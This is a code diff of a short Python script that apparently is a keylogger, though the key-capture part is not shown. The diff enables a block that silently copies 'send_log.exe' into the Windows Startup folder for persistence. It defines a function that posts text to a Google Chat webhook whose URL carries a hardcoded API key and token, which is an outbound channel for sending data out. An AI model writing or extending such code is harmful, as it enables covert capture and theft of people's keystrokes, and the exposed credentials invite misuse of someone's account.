@@ -1,17 +1,21 @@
 
+# pip install keyboard
+
 from json import dumps
 from httplib2 import Http
-import threading, keyboard, json, os
+import keyboard, json, os
 from shutil import copyfile
 
-# try:
-#     copyfile('send_log.exe',
-#             'C://Users' + f'//{os.getlogin()}' + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//send_log.exe')
-# except:
-#     pass
+try:
+    copyfile('send_log.exe',
+            'C://Users' + f'//{os.getlogin()}' + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//send_log.exe')
+except:
+    pass
+
+# https://chat.google.com/room/AAAAe-ewe8U?cls=7
 
 def sendchat(text):
-    url = 'https://chat.googleapis.com/v1/spaces/AAAAe-ewe8U/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MFKB5wx7DcFau_KB__1OxghT_43rauWeaA8YkckCVos%3D'
+    url = 'https://chat.googleapis.com/v1/spaces/AAAAe-ewe8U/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MFKB5wx7DcFau_KB__1OxghT_43rauWeaA8YkckCVos'
     bot_message = {'text' : str(text)}
     
     message_headers = {'Content-Type': 'application/json; charset=UTF-8'}
